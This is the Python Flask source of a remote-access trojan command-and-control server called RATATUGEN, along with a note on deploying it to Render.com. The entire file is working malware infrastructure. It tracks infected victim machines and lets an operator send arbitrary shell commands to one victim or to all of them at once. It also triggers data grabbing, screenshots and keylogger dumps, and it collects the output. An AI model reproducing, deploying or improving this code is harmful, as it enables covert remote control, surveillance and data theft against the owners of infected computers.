"""
RATATUGEN Web C2 Server - deploy to Render.com as Web Service
"""
from flask import Flask, request, render_template_string, redirect, session
import time

app = Flask(__name__)
app.secret_key = "ratatugen_c2_secret_2026"

ADMIN_PASSWORD = "ratatugen2026"

clients = {}
commands = {}
results = {}
message_log = []

STYLE = """
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#080808;color:#c0c0c0;font-family:Segoe UI,sans-serif;padding:15px}
  h1{color:#e00;font-size:20px;margin-bottom:5px}
  h2{color:#c00;font-size:16px;margin:15px 0 5px}
  hr{border-color:#222;margin:12px 0}
  .bar{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0;align-items:center}
  input,select{background:#111;border:1px solid #333;color:#fff;padding:7px 10px;border-radius:4px;font-family:monospace;font-size:12px}
  button,input[type=submit]{background:#c00;color:#fff;border:none;padding:7px 14px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:12px}
  button:hover{background:#f22}
  .card{background:#111;border:1px solid #222;border-radius:6px;padding:12px;margin:8px 0}
  .card h3{color:#e00;font-size:14px;margin-bottom:6px}
  .card .row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
  .badge{padding:3px 8px;border-radius:4px;font-size:11px;font-weight:bold}
  .online{background:#0a3;color:#fff}.offline{background:#333;color:#aaa}
  pre{background:#000;border:1px solid #222;padding:10px;border-radius:4px;margin:5px 0;max-height:200px;overflow-y:auto;font-size:11px;color:#aaa}
  .log{background:#000;border:1px solid #222;padding:8px;border-radius:4px;max-height:150px;overflow-y:auto;font-size:11px;margin:8px 0}
  .log span{color:#666;margin-right:8px}
  a{color:#c00;text-decoration:none}
"""

LOGIN_PAGE = '<!DOCTYPE html><html><head><title>RATATUGEN C2</title>' \
    '<meta name="viewport" content="width=device-width, initial-scale=1"><style>' + STYLE + \
    '</style></head><body style="display:flex;justify-content:center;align-items:center;height:100vh">' \
    '<div style="text-align:center"><h1>RATATUGEN C2</h1>' \
    '<form method="POST" style="margin-top:20px">' \
    '<input type="password" name="password" placeholder="Password" style="width:200px"><br><br>' \
    '<button type="submit" style="width:200px">Login</button>' \
    '</form></div></body></html>'

DASHBOARD_HTML = """<!DOCTYPE html><html><head><title>RATATUGEN C2</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>""" + STYLE + """</style>
<script>
function go(url){ window.location=url; }
function c(cid,cmd){ go('/cmd?client='+cid+'&cmd='+encodeURIComponent(cmd)); }
function shell(cid){ go('/cmd?client='+cid+'&cmd='+encodeURIComponent(document.getElementById('sh_'+cid).value)); }
</script></head><body>

<h1>RATATUGEN C2 <span style="font-size:14px;color:#666">| {{clients|length}} agents</span></h1>
<a href="/" style="font-size:12px">Refresh</a> | <a href="/logout" style="font-size:12px">Logout</a>

<div class="bar">
  <form action="/cmd" method="GET" style="display:flex;gap:6px;flex:1">
    <select name="client">
      <option value="*">ALL AGENTS</option>
      {% for cid, info in clients.items() %}
      <option value="{{cid}}">{{cid}}</option>
      {% endfor %}
    </select>
    <input name="cmd" placeholder="Shell command..." style="flex:1">
    <button>Send</button>
  </form>
</div>

<div class="bar">
  <form action="/cmd" method="GET" style="display:flex;gap:6px">
    <select name="client">
      <option value="*">ALL</option>
      {% for cid, info in clients.items() %}
      <option value="{{cid}}">{{cid}}</option>
      {% endfor %}
    </select>
    <button name="cmd" value="GRAB_ALL">Grab Data</button>
    <button name="cmd" value="SCREENSHOT">Screenshot</button>
    <button name="cmd" value="KEYLOG_DUMP">Dump Keys</button>
    <button name="cmd" value="UNINSTALL">Uninstall RAT</button>
  </form>
</div>

{% for cid, info in clients.items() %}
<div class="card">
  <div class="row">
    <h3 style="flex:1">{{cid}}</h3>
    <span class="badge {{'online' if info.get('online') else 'offline'}}">{{'ONLINE' if info.get('online') else 'OFFLINE'}}</span>
  </div>
  <div class="row" style="font-size:11px;color:#888">
    <span>PC: {{info.get("pc","?")}}</span>
    <span>User: {{info.get("user","?")}}</span>
    <span>Last: {{info.get("last","-")}}</span>
  </div>
  <div class="row" style="margin-top:6px">
    <input id="sh_{{cid}}" placeholder="cmd..." style="flex:1;width:150px">
    <button onclick="shell('{{cid}}')">Shell</button>
    <button onclick="c('{{cid}}','GRAB_ALL')">Grab</button>
    <button onclick="c('{{cid}}','SCREENSHOT')">SS</button>
    <button onclick="c('{{cid}}','KEYLOG_DUMP')">Keys</button>
    <button onclick="c('{{cid}}','UNINSTALL')" style="background:#333;color:#f66">Kill</button>
  </div>
  {% if cid in results and results[cid] %}
  <div style="margin-top:4px">
  {% for t, cmd, out in results[cid][-3:]|reverse %}
    <pre><b>{{t}}</b> $ {{cmd}}
{{out}}</pre>
  {% endfor %}
  </div>
  {% endif %}
</div>
{% endfor %}

<h2>Recent Activity</h2>
<div class="log">
{% for t, cid, text in message_log[-30:]|reverse %}
  <div><span>{{t}}</span> [{{cid}}] {{text}}</div>
{% endfor %}
</div>

</body></html>"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['authed'] = True
            return redirect('/')
        return LOGIN_PAGE.replace('Password', 'Wrong Password')
    if not session.get('authed'):
        return LOGIN_PAGE
    return dashboard()

@app.route('/logout')
def logout():
    session.pop('authed', None)
    return redirect('/')

def dashboard():
    now = time.time()
    for cid in list(clients.keys()):
        clients[cid]['online'] = (now - clients[cid].get('_last', 0)) < 30
        clients[cid]['last'] = time.ctime(clients[cid].get('_last', 0))
    return render_template_string(DASHBOARD_HTML, clients=clients, results=results, message_log=message_log)

@app.route('/cmd')
def cmd():
    if not session.get('authed'): return redirect('/')
    cid = request.args.get('client', '')
    command = request.args.get('cmd', '')
    if cid and command:
        commands[cid] = command
        message_log.append((time.ctime(), cid, 'Queued: ' + command))
    return redirect('/')

@app.route('/register', methods=['POST'])
def register():
    d = request.get_json(silent=True) or {}
    cid = d.get('id', '?')
    clients[cid] = {'pc': d.get('pc','?'), 'user': d.get('user','?'), '_last': time.time(), 'last': time.ctime(), 'online': True}
    message_log.append((time.ctime(), cid, 'Online'))
    return {'status': 'ok'}

@app.route('/poll', methods=['POST'])
def poll():
    d = request.get_json(silent=True) or {}
    cid = d.get('id', '?')
    if cid not in clients:
        clients[cid] = {'pc': cid, 'user': '?', '_last': time.time(), 'online': True}
    clients[cid]['_last'] = time.time()
    clients[cid]['online'] = True
    cmd = commands.pop(cid, None) or commands.pop("*", None)
    return {'command': cmd or ''}

@app.route('/result', methods=['POST'])
def result():
    d = request.get_json(silent=True) or {}
    cid = d.get('id', '?')
    cmd = d.get('command', '')
    out = d.get('output', '')
    if cid not in results:
        results[cid] = []
    results[cid].append((time.ctime(), cmd, out))
    if len(results[cid]) > 20:
        results[cid] = results[cid][-20:]
    message_log.append((time.ctime(), cid, 'Result: ' + cmd))
    return {'status': 'ok'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)